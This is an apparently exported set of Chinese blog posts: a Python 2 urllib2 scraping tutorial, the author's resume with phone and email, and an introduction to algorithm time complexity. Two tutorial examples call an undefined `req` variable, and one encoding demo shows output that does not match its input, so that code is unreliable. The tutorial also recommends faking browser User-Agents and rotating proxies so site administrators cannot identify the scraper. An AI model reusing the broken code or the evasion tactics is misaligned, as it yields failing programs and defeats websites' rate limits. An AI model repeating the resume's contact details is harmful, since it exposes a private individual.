这个组件来抓取⽹⻚。 urllib2 是 Python2.7 ⾃带的模块(不需要下载)， 是 Python 的⼀个获取URLs(Uniform Resource Locators)的重要组件。 urllib2 官⽅⽂档：https://docs.python.org/2/library/urllib2.html urllib2 源码：https://hg.python.org/cpython/file/2.7/Lib/urllib2.py urllib2 在 python3.x 中被改为 urllib.request 1.urlopen 我们先来段代码： 12345# urllib2_baidu.pyimport urllib2response = urllib2.urlopen(\"http://www.baidu.com\")html = response.read()print html So Easy! 最简单的获取⼀个 url 的⻚⾯代码居然只需要 4⾏！ 执⾏写的 python 代码: 1Power@PowerMac ~$: python urllib2_baidu.py 会看到以下结果： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"&gt;&lt;meta content=\"always\" name=\"referrer\"&gt;&lt;meta name=\"theme-color\" content=\"#2932e1\"&gt;&lt;link rel=\"shortcut icon\" href=\"/favicon.ico\" type=\"image/x-icon\" /&gt;&lt;link rel=\"search\" type=\"application/opensearchdescription+xml\" href=\"/content-search.xml\" title=\"百度搜索\" /&gt;&lt;link rel=\"icon\" sizes=\"any\" mask href=\"//www.baidu.com/img/baidu.svg\"&gt;&lt;link rel=\"dns-prefetch\" href=\"//s1.bdstatic.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t1.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t2.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t3.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t10.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t11.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t12.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//b1.bdstatic.com\"/&gt;&lt;title&gt;百度⼀下，你就知道&lt;/title&gt; ... ​ 实际上，如果我们在浏览器上打开百度主⻚， 右键选择“查看源代码”，你会发现，跟我们刚才打印出来的是⼀模⼀样。也就是说，上⾯的4⾏代码就已经帮我们把百度的⾸⻚的全部代码爬了下来。 分析代码： 我们来分析⼀下上⾯的这 4⾏代码： 1.第⼀⾏： 1import urllib2 就是将 urllib2 组建引⼊进来，供给我们使⽤。 2.第⼆⾏ 1response = urllib2.urlopen(\"http://www.baidu.com\") 然后我们调⽤的是 urllib2 库⾥⾯的 urlopen ⽅法，传⼊的 url⽹址是百度⾸⻚， urlopen()⽅法⼀般接受三个参数：urlopen(url, data=None, timeout=) 第⼀个参数 URL 是必须要传送的，可以传⼊⼀个字符串类型的url 地址，同时打开这个 url 并返回⼀个像⽂件对象⼀样的对象。 第⼆个参数是 data 是经过编码的 post 数据（⼀般使⽤urllib.urlencode()来编码，我们后⾯会说到），默认为空None；第三个参数是 timeout 是可选的超时期（以秒为单位），供所有阻塞操作内部使⽤。默认为 60s，也可以直接设置 timeout=10 3.第三⾏ 1html = response.read() urlopen()返回的⽂件对象，除了⽀持⽂件⽅法外，还⽀持下⾯的这 些常⽤的⽅法： response.getcode() 返回整数形式的 HTTP 响应代码，⽐如成功返回 200,未找到⽂件时返回 404 response.geturl() 返回所返回的数据的实际 url，但是会考虑发⽣的重定向问题 response.info() 返回映射对象，该对象带有与 url 关联的信息，对 HTTP 来说， 返回的服务器响应包含 HTTP 报头 4.第四⾏ 1print html 最后就是将字符串打出来，显示到终端上。 ⼀个基本的 url 请求对应的 python 代码真的⾮常简单。 Request 我们编辑 urllib2_test2.py 123456# urllib2_request.pyimport urllib2request = urllib2.Request(\"http://www.baidu.com\")response = urllib2.urlopen(request)html = response.read()print html 运⾏结果是完全⼀样的： 在我们第⼀个例⼦⾥，urlopen()的 url 参数就是⼀个 url 地址；但是如果需要执⾏更复杂的操作，⽐如增加 HTTP 报头，可以创建⼀个Request 实例来作为 urlopen()的 url 参数，⽽url 地址则作为 Request 实例 的参数。 新建 Request 实例，url 为 url 字符串，data 是伴随 url 提交的数据（⽐如要 post 的数据），headers 是⼀个字典，包含了可表示 HTTP 报头的键值对,注意，data 请求为空时，默认 HTTP 请求为&quot;GET&quot;，提供 data 参数时，HTTP 请求将从&quot;GET&quot;改为‘POST’。 2.User-Agent 但是这样直接⽤python的urllib2给⼀个⽹站发送请求的话，确实略有些唐突了，就好⽐，⼈家每家都有⻔，你以⼀个路⼈的身份直接闯进去显然不是很礼貌。所以有⼀些站点不喜欢被程序（⾮⼈为访问）访问，有可能会拒绝你的访问请求。 ​ 但是如果我们⽤⼀个合法的身份去请求别⼈⽹站，显然⼈家就是欢迎的。 所以我们就应该给我们的这个代码加上⼀个身份，就是所谓的 User-Agent 头。 User-Agent？显然如果你不是学习前端专业的，这个东⻄确实对于后端开发⼯程师是⼀个头疼的东⻄， 不过不要紧，不是我们的东⻄我们只作为了解即可。 我们只需要知道，⽤ 不同的浏览器 在发送请求的时候，会有不同的 UserAgent 头。 浏览器 就是互联⽹世界上 被允许的身份 。 那么如果你不想你的爬⾍代码成为⼀个路⼈，你需要伪装成⼀个被 公认的浏览器 。伪装的办法就是给⾃⼰的请求加上⼀个对应的 User-Agent 头。 12345678910#urllib2_useragent.pyimport urllib2url = \"http://www.baidu.com\"#IE 9.0 的 User-Agentheader = &#123;\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"&#125;request = urllib2.Request(url, headers = header)response = urllib2.urlopen(req)html = response.read()print html 3.添加更多的 Header 信息 在 HTTP Request 中加⼊特定的 Header，来构造⼀个完整的 HTTP 请求消息。 可以通过调⽤ Request.add_header() 添加/修改⼀个特定的 header 123456789101112131415# urllib2_headers.pyimport urllib2url = \"http://www.baidu.com\"#IE 9.0 的 User-Agentheader = &#123;\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"&#125;request = urllib2.Request(url, headers = header)#也可以通过调⽤Request.add_header() 添加/修改⼀个特定的 headerrequest.add_header(\"Connection\", \"keep-alive\")# 也可以通过调⽤Request.get_header()来查看 header 信息# request.get_header(header_name=\"Connection\")response = urllib2.urlopen(req)print response.code #可以查看响应状态码html = response.read()print html headers 的⼀些属性，需要特别注意⼀下： User-Agent : 有些服务器或 Proxy 会通过该值来判断是否是浏览器发出的请求; Content-Type : ⽤来确定 HTTP Body 中的内容该怎样解析， 服务 器会检查该值，设置错误会导致服务器拒绝服务 application/xml ： 在 XML RPC 调⽤时使⽤ application/json ： 在 JSON RPC 调⽤时使⽤ application/x-www-form-urlencoded ： 浏览器提交 Web 表单时使⽤ 4.数据传送 上⾯演示的都是最基本的⽹⻚抓取，有时候我们也希望发送⼀些数据到URL， ⽐如账号密码、表单数据等等，这样也能得到相应的响应。 urllib2 默认只⽀持 HTTP 的 GET 和 POST ⽅法 Get⽅式 GET 请求⼀般⽤于我们向服务器获取数据，⽐如说，我们⽤百度搜索 老男孩 https://www.baidu.com/s?wd= 老男孩 在其中我们可以看到在 http://www.baidu.com/s? 之后出现⼀个⻓⻓的字符串，其中就包含我们要查询的关键词。通过 Fiddler 观察，发现 URL 的QueryString 查询字符串的键是 wd ，于是我们可以尝试⽤默认的 Get⽅式来 发送请求。 12345678910111213# urllib2_get.pyimport urllib #负责 url 编码处理import urllib2url = \"http://www.baidu.com/s\"word = &#123;\"wd\":\"老男孩\"&#125;word = urllib.urlencode(word) #转换成 url 编码格式（字符串）newurl = url + \"?\" + word # url⾸个分隔符就是 ?headers=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"&#125;request = urllib2.Request(newurl, headers=headers)response = urllib2.urlopen(request)print response.read() ⼀般 HTTP 请求提交 HTML 表单数据，word 需要编码成 URL 编码格式，然后 做为参数传到 Request 对象。 urllib 和 urllib2 都是接受 URL 请求的相关模块，但是提供了不同的功能。 两个最显著的不同如下： urllib 仅可以接受 URL，⽽ urllib2 可以接受⼀个设置了 headers 的Request 类实例。这表示我们可以伪装⾃⼰的 User Agent 字符串等。 urllib 提供 urlencode ⽅法⽤来 GET 查询字符串的产⽣，⽽ urllib2没有。这是为何 urllib 常和 urllib2 ⼀起使⽤的原因。 编码⼯作使⽤urllib 的 urlencode() 函数，帮我们将 key:value 这样的键值对转换成 “key=value” 这样的字符串，解码⼯作可以使⽤urllib 的 unquote() 函数。（注意，不是 urllib2.urlencode() ) 12345678910# IPython2 中的测试结果In [1]: import urllibIn [2]: word = &#123;\"wd\":\"老男孩\"&#125;# 将字典按 URL 编码转换，汉字部分先转成 GBK 编码，然后把 \\x 替换成 %In [3]: urllib.urlencode(word)Out[3]: \"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2\"# 把 % 替换成 \\x，变回 GBK 编码，打印出来In [4]: print urllib.unquote(\"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2\")wd=老男孩 **POST⽅式： ** 上⾯我们说了 Request 请求对象的⾥有 data 参数，它就是⽤在 POST⾥的，我 们要传送的数据就是这个参数 data，data 是⼀个字典，⾥⾯要匹配键值对。 拿拉勾⽹站数据举例，https://www.lagou.com/ 在站内搜索任意关键字 。 输⼊测试数据，再通过使⽤Fiddler 观察，其中有⼀条是 POST 请求，响应⽂件是 JSON 格式⽂件，⽽向服务器发送的请求数据并不是在 url⾥，那么我们可以试着模拟这个 POST 请求。 于是，我们可以尝试⽤POST⽅式发送请求 1234567891011121314151617181920# urllib2_post.pyimport urllib2import urlliboutput = open(\"lagou.json\", \"w\")page = 1# POST 请求要传送的数据formdata = \"first=false&amp;pn=\" + str(page) + \"&amp;kd=xxx\"headers=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"&#125;request = urllib2.Request(\"http://www.lagou.com/jobs/positionAjax.json?px=new&amp;needAddtionalResult=false\", headers=headers)# 通过 request.add_data() 将 data 数据传进⼊request 内request.add_data(formdata)#print request.get_data()response = urllib2.urlopen(request)print response.code#print resHtmloutput.write(response.read())output.close() 当然可以⽤post 的⽅式发送账号密码到登录界⾯模拟登陆，当⽹⻚采⽤JavaScript 动态技术以后，想封锁基于 HttpClient 的模拟登录就太容易了，甚⾄可以根据你的⿏标活动的特征准确地判断出是不是真⼈在操作。 所以，想做通⽤的模拟登录还得选别的技术，⽐如⽤内置浏览器引擎的爬⾍(关键词：Cookie，PhantomJS，Selenium)，这个我们将在以后会学习到。 问题：为什么有时候 POST 也能在 URL 内看到数据？ GET⽅式是直接以链接形式访问，链接中包含了所有的参数，服务器端⽤Request.QueryString获取变量的值。如果包含了密码的话是⼀种不安全的选择，不过你可以直观地看到⾃⼰提交了什么内容。 POST则不会在⽹址上显示所有的参数，服务器端⽤Request.Form获取提交的数据，在 Form 提交的时候。但是 HTML 代码⾥如果不指 定 method 属性，则默认为 GET 请求，Form 中提交的数据将会附加 在 url 之后，以 ? 分开与 url 分开。 表单数据可以作为 URL 字段（method=“get”）或者 HTTP POST（method=“post”）的⽅式来发送。⽐如在下⾯的 HTML 代码中，表单数据将因为 （method=“get”） ⽽附加到 URL 上： 12345&lt;form action=\"form_action.asp\" method=\"get\"&gt;&lt;p&gt;First name: &lt;input type=\"text\" name=\"fname\" /&gt;&lt;/p&gt;&lt;p&gt;Last name: &lt;input type=\"text\" name=\"lname\" /&gt;&lt;/p&gt;&lt;input type=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt; 5.⾃定义 Opener 基本的 urlopen()函数不⽀持代理、cookie 或其他的 HTTP⾼级功能。要⽀持这些功能， 必须使⽤ build_opener() 函数来创建⾃⼰的⾃定义opener 对象。 opener 是 urllib2.OpenerDirector 的实例，我们之前⼀直都在使⽤的urlopen，它是⼀个特殊的 opener install_opener 将⾃定义的 opener 对象 定义为 全局 opener，表示如果之后凡是调⽤urlopen，都将使⽤这个 opener（根据⾃⼰的需求来选择） 6.Proxy（代理）的设置 很多⽹站会检测某⼀段时间某个 IP 的访问次数，如果访问次数过多，它会禁⽌你的访问。所以我们可以设置⼀些代理服务器，每隔⼀段时间换⼀个代理，⽹站管理员就不知道是谁在捣⻤了。 urllib2 中通过 ProxyHandler 来设置使⽤代理服务器，下⾯代码说明如何实⽤⾃定义 opener 来使⽤代理： 123456789101112131415161718#urllib2_proxy.pyimport urllib2proxyWork = True #定义⼀个代理开关# 定义了两个代理模式，其中⼀个为不适⽤代理httpProxyHandler = urllib2.ProxyHandler(&#123;\"http\" : \"124.88.67.81:80\"&#125;)nullProxyHandler = urllib2.ProxyHandler(&#123;&#125;)if proxyWork: #根据代理开关是否打开，使⽤不同的代理模式opener = urllib2.build_opener(httpProxyHandler)else:opener = urllib2.build_opener(nullProxyHandler)# 如果这么写，之后的 urlopen 将使⽤这个 opener#urllib2.install_opener(opener)#response = urlopen(\"http://www.baidu.com/\")# 使⽤我们⾃定义的代理 opener 的 open()⽅法打开 urlresponse = opener.open(\"http://www.baidu.com/\")html = response.read()print html 7.Debug Log 使⽤ urllib2 时，可以通过下⾯的⽅法把 HTTP 和 HTTPS 的 debug Log 打开，这样程序在执⾏的时候，会把收发包的内容在屏幕上打印出来，⽅便调试，有时可以省去抓包的⼯作 。 123456789101112# urllib2_debuglog.pyimport urllib2# 打开 HTTP debug loghttpHandler = urllib2.HTTPHandler(debuglevel=1)# 打开 HTTPS debug loghttpsHandler = urllib2.HTTPSHandler(debuglevel=1)# 同时使⽤两种不同的 debug log 模式opener = urllib2.build_opener(httpHandler, httpsHandler)# 使⽤install_opener ⽤来创建全局的 openerurllib2.install_opener(opener)# urlopen() 默认使⽤之前创建的全局 openerresponse = urllib2.urlopen(\"http://www.baidu.com\") 8.Cookie Cookie 是指某些⽹站的 Web 服务器为了辨别⽤户身份和进⾏Session 跟踪⽽储存在⽤户浏览器上的⽂本⽂件，Cookie 可以保持登录信息到⽤户下次与服务器的会话。 Cookie 由变量名和值组成，根据 Netscape 公司的规定，Cookie 格式如下：Set－Cookie: NAME=VALUE；Expires=DATE；Path=PATH；Domain=DOMAIN_NAME； SECURE但是注意： 登录⼀般都会先有⼀个 HTTP GET，⽤于拉取⼀些信息及获得Cookie，然后再 HTTP POST 登录。 http POST 登录的链接有可能是动态的，从 GET 返回的信息中获取。 password 有些是明⽂发送，有些是加密后发送，有些甚⾄⽤动态加密的，包括了很多其他数据的加密信息，不只是密码。能通过查看JS 源码获得加密算法。 ⼤多数⽹站的登陆整体流程类似，可能有些细节不⼀样，所以不能 保证其他⽹站登录成功。 cookielib 库 cookielib 模块的主要作⽤是提供⽤于存储 cookie 的对象，⼀般与 urllib2 模块配 合使⽤，Python 处理 cookie 是⼀般是 cookielib 和 HTTPCookieProcessor⼀ 起使⽤。 该模块主要的对象有 CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。 它们的关系：CookieJar —-派⽣—-&gt; FileCookieJar(Cookie⽂件保存) —-派⽣—–&gt; MozillaCookieJar(Firefox 浏览器 Cookie) 和 LWPCookieJar。 CookieJar 管理 HTTP cookie 值、存储 HTTP 请求⽣成的 cookie、向传出的 HTTP请求添加 cookie 的对象。整个 cookie 都存储在内存中，对 CookieJar 实例进⾏垃圾回收后 cookie 也将丢失。 FileCookieJar (filename,delayload=None,policy=None) 创建 FileCookieJar 实例，检索 cookie 信息并将 cookie 存储到⽂件中。filename 是存储 cookie 的⽂件名。delayload 为 True 时⽀持延迟访问访问⽂件，即只有在需要时才读取⽂件或在⽂件中存储数据 MozillaCookieJar (filename,delayload=None,policy=None) 创建与 Mozilla 浏览器 cookies.txt 兼容的 FileCookieJar 实例。 LWPCookieJar (filename,delayload=None,policy=None) 创建与 libwww-perl 的 Set-Cookie3⽂件格式兼容的 FileCookieJar 实例。 1）使⽤get⽅式获取 Cookie 保存到变量 1234567891011121314151617# urllib2_cookielibtest1.pyimport urllib2import cookielib#声明⼀个 CookieJar 对象实例来保存 cookiecookie = cookielib.CookieJar()#利⽤urllib2 库的 HTTPCookieProcessor 对象来创建 cookie 处理器handler=urllib2.HTTPCookieProcessor(cookie)#通过 handler 来构建 openeropener = urllib2.build_opener(handler)#此处的 open⽅法同 urllib2 的 urlopen⽅法，也可以传⼊requestresponse = opener.open(\"http://www.baidu.com\")# 按标准格式存储 Cookiecookies = \"\"for item in cookie:cookies = cookies + item.name + \"=\" + item.value + \";\"# 舍去最后⼀位的分号print cookies[:-1] 我们使⽤以上⽅法将 cookie 保存到变量中，然后打印出了 cookie 中的值，运⾏结果如下： 123BAIDUID=4327A58E63A92B73FF7A297FB3B2B4D0:FG=1;BIDUPSID=4327A58E63A92B73FF7A297FB3B2B4D0;H_PS_PSSID=1429_21115_17001_21454_21409_21554_21398;PSTM=1480815736;BDSVRTM=0;BD_HOME=0 2) 访问⽹站获得 cookie，并把获得的 cookie 保存在 cookie⽂件中 123456789101112131415# urllib2_cookielibtest2.pyimport cookielibimport urllib2# 设置保存 cookie 的⽂件，同级⽬录下的 cookie.txtfilename = 'cookie.txt'# 声明⼀个 LWPCookieJar(有 save 实现)对象实例来保存 cookie，之后写⼊⽂件cookie = cookielib.LWPCookieJar(filename)# 利⽤urllib2 库的 HTTPCookieProcessor 对象来创建 cookie 处理器handler = urllib2.HTTPCookieProcessor(cookie)# 通过 handler 来构建 openeropener = urllib2.build_opener(handler)# 创建⼀个请求，原理同 urllib2 的 urlopenresponse = opener.open(\"http://www.baidu.com\")# 保存 cookie 到⽂件，且忽略 cookie 失效限制cookie.save(ignore_discard=True, ignore_expires=True) 3) 从⽂件中获取 cookies 并访问 12345678910111213# urllib2_cookielibtest2.pyimport cookielibimport urllib2# 创建 LWPCookieJar(有 load 实现)实例对象cookie = cookielib.LWPCookieJar()# 从⽂件中读取 cookie 内容到变量，忽略 cookie 的使⽤时效cookie.load('cookie.txt', ignore_discard=True, ignore_expires=True)# 创建请求的 requestreq = urllib2.Request(\"http://www.baidu.com\")# 利⽤urllib2 的 build_opener⽅法创建⼀个 openeropener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))response = opener.open(req)print response.read()","categories":[{"name":"网络爬虫","slug":"网络爬虫","permalink":"https://xiaowuyoucy.github.io/categories/网络爬虫/"}],"tags":[{"name":"urlib2","slug":"urlib2","permalink":"https://xiaowuyoucy.github.io/tags/urlib2/"}]},{"title":"Resume of David Wei","slug":"201609270452","date":"2016-09-26T20:55:00.000Z","updated":"2019-09-27T01:25:18.900Z","comments":true,"path":"2016/09/27/201609270452/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/09/27/201609270452/","excerpt":"","text":"姓名：温剑威 出生年月日：19960206 性别：男 现居住地：广州市天河区 电话：13926259736 mail:jww1996@foxmail.com IT技能专长： 熟练使用python进行后端开发 熟练使用Django ：ORM，Form，Template，Tags，Middleware自定制等技术 熟练使用PHP，ThinkPHP ，HTML，CSS，JavaScript，JQuery，Ajax，Bootstrap等页面开发技术 熟练Socket网络编程，多线程，多进程，协程，异步IO多路复用如select/poll/epoll 的原理及使用 熟练使用装饰器，迭代器，生成器及单例模式的使用 熟练操作MySQL，基础的增删改查语句，会使用关联查询等较复杂语句，对存储过程，事物操做有一定的了解 熟悉requests模块及爬虫框架Scrapy进行网页爬取，解析，并了解其原理 熟悉Numpy、Pandas、Matplotlib、Seaborn数据分析库 熟悉Tensorflow、Caffe等人工智能开发框架 熟悉机器学习常用算法（线性回归、逻辑回归、贝叶斯、决策树、SVM、降维、聚类、EM等）及代码实现 了解深度学习算法RNN,LSTM,GAN,DCGAN,DQN,CNN等 了解常见的算法与数据结构 如（冒泡排序，堆排序，快速排序）等 ​ 社会活动与项目经历： 2018.03-2019.03 Python： -Python讲师 ​ 2018.03-2018.05 Python机器学习书籍撰写 ： -撰写书籍 ​ 2017.08-2018.02 项目名称：CRM客户关系管理系统 : -项目描述：实现企业客户数据管理，实现市场营销、销售、服务等活动自动化，并建立一个客户信息的收集、管理、分析、利用的系统。 -项目功能：1. 可视化界面对各种数据进行手动录入操作；2. 运营数据的增、删、改、查； -开发要点：1. 参考Django Admin、ModelForm自定义后台操作组件及数据库表操作；2. 基于角色进行权限控制；3. 自定义分页功能 2017.02-2017.07 项目名称：公交管理系统 ： -项目描述：实现公交企业内部运营管理的自动化，实现运营部门，车队，调度各方面职责的权限细化，解决手动记录派班、车次和考勤的不便利性，便于通过数据进行计划、分析和执行。 -项目功能：1. 可视化界面对各种数据进行手动录入操作；2. 运营数据的增、删、改、查； -项目描述：实现公交企业内部运营管理的自动化，实现运营部门，车队，调度各方面职责的权限细化，解决手动记录派班、车次和考勤的不便利性，便于通过数据进行计划、分析和执行。 2016.07-2016.12 情感分析 : -运用自然语言处理、文本挖掘及计算机语言学等方法来识别和提取藏文语料素材中的主观信息 2016.01-2017.02 网络安全： -主要负责网络安全 -代码审计漏洞挖掘，渗透测试评估以及漏洞修复方案 -给广大客户的站点，提供WEB漏洞修复方案 2015.08-2016.01 前端开发（实习）： -负责前端开发，协作后端工程师完成网站，前后端对接以及用户体验的构想并实现 工作简历: -2016.01-2017.07 广州拓宏网络科技有限公司 -2016.01-2017.07 嘉峪科技有限公司 -2017.11-2018.06 水木为名教育科技有限公司 -2018.06-2019.03 老男孩教育科技有限公司（深圳分公司） IT、汉语水平、英语技能: -2012.05 CCT全国高等学校计算机考试（二级） -2015.01 Web开发（熟练掌握） -2016.04 普通话水平测试（二级甲等） -2017.06 CET-4（428分） 兴趣爱好： -人工智能:（两年AI经验，目前研究自动程序计 ） -英语：（坚持背单词，平均每天20个） -电影：类型（动作，奇幻，喜剧，恐怖，冒险，爱情，警匪，科幻，温情，史诗） -音乐：类型（经典，流行，嘻哈，英语，粤语，日语） -健身：（大学坚持健身三年半） -理财（买过基金，现在主要关注互联网金融，投资P2P） -读书（心理学、经济类、历史类、科技类、人文类、金融类、政治类等） 自我评价： -乐于分享，帮助他人。善于团结他人，乐于奉献。 -自学能力强，逻辑清晰严谨，沟通表达能力强。 -有团队意识，以大局为重。可以为了集体利益牺牲个人利益。 -做事认真，有责任心。领导交办的事都会保质保量按时完成。 -总体来说是一个忠于自己价值观及自己所重视的人的理想主义者。","categories":[{"name":"关于博主","slug":"关于博主","permalink":"https://xiaowuyoucy.github.io/categories/关于博主/"}],"tags":[{"name":"简历","slug":"简历","permalink":"https://xiaowuyoucy.github.io/tags/简历/"}]},{"title":"数据结构与算法","slug":"201607092036","date":"2016-07-09T12:36:18.000Z","updated":"2019-04-09T19:05:16.770Z","comments":true,"path":"2016/07/09/201607092036/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/07/09/201607092036/","excerpt":"","text":"算法的概念 算法是计算机处理信息的本质，因为计算机程序本质上是一个算法来告诉计算机确切的步骤来执行一个指定的任务。一般地，当算法在处理信息时，会从输入设备或数据的存储地址读取数据，把结果写入输出设备或某个存储地址供以后再调用。 算法是独立存在的一种解决问题的方法和思想。 对于算法而言，实现的语言并不重要，重要的是思想。 算法可以有不同的语言描述实现版本（如C描述、C++描述、Python描述等），我们现在是在用Python语言进行描述实现。 算法的五大特性 输入: 算法具有0个或多个输入 输出: 算法至少有1个或多个输出 有穷性: 算法在有限的步骤之后会自动结束而不会无限循环，并且每一个步骤可以在可接受的时间内完成 确定性：算法中的每一步都有确定的含义，不会出现二义性 可行性：算法的每一步都是可行的，也就是说每一步都能够执行有限的次数完成 引入案例 如果 a+b+c=1000，且 a2a^{2}a2+b2b^{2}b2=c2c^{2}c2（a,b,c 为自然数），如何求出所有a、b、c可能的组合? 题解: 1234567891011121314import timestart_time = time.time()# 注意是三重循环for a in range(0, 1001): for b in range(0, 1001): for c in range(0, 1001): if a**2 + b**2 == c**2 and a+b+c == 1000: print(\"a, b, c: %d, %d, %d\" % (a, b, c))end_time = time.time()print(\"elapsed: %f\" % (end_time - start_time))print(\"complete!\") 运行结果： 123456a, b, c: 0, 500, 500a, b, c: 200, 375, 425a, b, c: 375, 200, 425a, b, c: 500, 0, 500elapsed: 214.583347complete! 注意运行的时间:214.583347秒 显然是一个失败的算法，将近用了4分钟，我们先明确一下这道题的一些要求和规律，当中的 A,B,C 其当中的一个数和另外的两个数是有关系的，当我们知道 A,B的时候 C的结果其实已经被确定了，我们可以把结果抽象成算式 C = 1000 - B - A 优化代码： 1234567891011121314import timestart_time = time.time()# 注意是两重循环for a in range(0, 1001): for b in range(0, 1001-a): c = 1000 - a - b if a**2 + b**2 == c**2: print(\"a, b, c: %d, %d, %d\" % (a, b, c))end_time = time.time()print(\"elapsed: %f\" % (end_time - start_time))print(\"complete!\") 注意运行的时间:0.182897秒 计算效率均衡 执行时间反应算法效率 对于同一问题，我们给出了两种解决算法，在两种算法的实现中，我们对程序执行的时间进行了测算，发现两段程序执行的时间相差悬殊（214.583347秒相比于0.182897秒），由此我们可以得出结论：实现算法程序的执行时间可以反应出算法的效率，即算法的优劣。 单靠时间值绝对可信吗？ 假设我们将第二次尝试的算法程序运行在一台配置古老性能低下的计算机中，情况会如何？很可能运行的时间并不会比在我们的电脑中运行算法一的214.583347秒快多少。 单纯依靠运行的时间来比较算法的优劣并不一定是客观准确的！ 程序的运行离不开计算机环境（包括硬件和操作系统），这些客观原因会影响程序运行的速度并反应在程序的执行时间上。那么如何才能客观的评判一个算法的优劣呢？ 时间复杂度与“大O记法 我们假定计算机执行算法每一个基本操作的时间是固定的一个时间单位，那么有多少个基本操作就代表会花费多少时间单位。算然对于不同的机器环境而言，确切的单位时间是不同的，但是对于算法进行多少个基本操作（即花费多少时间单位）在规模数量级上却是相同的，由此可以忽略机器环境的影响而客观的反应算法的时间效率。 对于算法的时间效率，我们可以用“大O记法”来表示。 “大O记法”：对于单调的整数函数f，如果存在一个整数函数g和实常数c&gt;0，使得对于充分大的n总有f(n)&lt;=c*g(n)，就说函数g是f的一个渐近函数（忽略常数），记为f(n)=O(g(n))。也就是说，在趋向无穷的极限意义下，函数f的增长速度受到函数g的约束，亦即函数f与函数g的特征相似。 时间复杂度：假设存在函数g，使得算法A处理规模为n的问题示例所用时间为T(n)=O(g(n))，则称O(g(n))为算法A的渐近时间复杂度，简称时间复杂度，记为T(n) 如何理解“大O记法” 对于算法进行特别具体的细致分析虽然很好，但在实践中的实际价值有限。对于算法的时间性质和空间性质，最重要的是其数量级和趋势，这些是分析算法效率的主要部分。而计量算法基本操作数量的规模函数中那些常量因子可以忽略不计。例如，可以认为 3n23n{^2}3n2 和 100n2100n{^2}100n2属于同一个量级，如果两个算法处理同样规模实例的代价分别为这两个函数，就认为它们的效率“差不多”，都为 n2n^{2}n2级 最坏时间复杂度 分析算法时，存在几种可能的考虑： 算法完成工作最少需要多少基本操作，即最优时间复杂度 算法完成工作最多需要多少基本操作，即最坏时间复杂度 算法完成工作平均需要多少基本操作，即平均时间复杂度 对于最优时间复杂度，其价值不大，因为它没有提供什么有用信息，其反映的只是最乐观最理想的情况，没有参考价值。 对于最坏时间复杂度，提供了一种保证，表明算法在此种程度的基本操作中一定能完成工作。 对于平均时间复杂度，是对算法的一个全面评价，因此它完整全面的反映了这个算法的性质。但另一方面，这种衡量并没有保证，不是每个计算都能在这个基本操作内完成。而且，对于平均情况的计算，也会因为应用算法的实例分布可能并不均匀而难以计算。 因此，我们主要关注算法的最坏情况，亦即最坏时间复杂度。 时间复杂度的几条基本计算规则 基本操作，即只有常数项，认为其时间复杂度为O(1) 顺序结构，时间复杂度按加法进行计算 循环结构，时间复杂度按乘法进行计算 分支结构，时间复杂度取最大值 判断一个算法的效率时，往往只需要关注操作数量的最高次项，其它次要项和常数项可以忽略 在没有特殊说明时，我们所分析的算法的时间复杂度都是指最坏时间复杂度 算法分析 第一次尝试的算法核心部分 12345for a in range(0, 1001): for b in range(0, 1001): for c in range(0, 1001): if a**2 + b**2 == c**2 and a+b+c == 1000: print(\"a, b, c: %d, %d, %d\" % (a, b, c)) 时间复杂度： T(n) = O(n * n *n) = O(n3) ​ 2.第二次尝试的算法核心部分 12345for a in range(0, 1001): for b in range(0, 1001-a): c = 1000 - a - b if a**2 + b**2 == c**2: print(\"a, b, c: %d, %d, %d\" % (a, b, c)) 时间复杂度： T(n) = O(n * n * (1+1)) = O(n*n) = O(n2) 由此可见，我们尝试的第二种算法要比第一种算法的时间复杂度好多的。 常见时间复杂度 注意，经常将log2n（以2为底的对数）简写成logn 所消耗的时间从小到大 O(1) &lt; O(logn) &lt; O(n) &lt; O(nlogn) &lt; O(n2n^{2}n2) &lt; O((n3n^{3}n3) &lt; O((2n2^{n}2n) &lt; O(n!) &lt; O(nn) 练习： 时间复杂度练习( 参考算法的效率规则判断 ) O(5) O(2n + 1) O(n²+ n + 1) O(3n³+1)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://xiaowuyoucy.github.io/tags/算法/"}]},{"title":"数据结构顺序表的形式","slug":"201604101526","date":"2016-04-19T07:26:18.000Z","updated":"2019-04-10T07:52:28.962Z","comments":true,"path":"2016/04/19/201604101526/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/04/19/201604101526/","excerpt":"","text":"顺序表 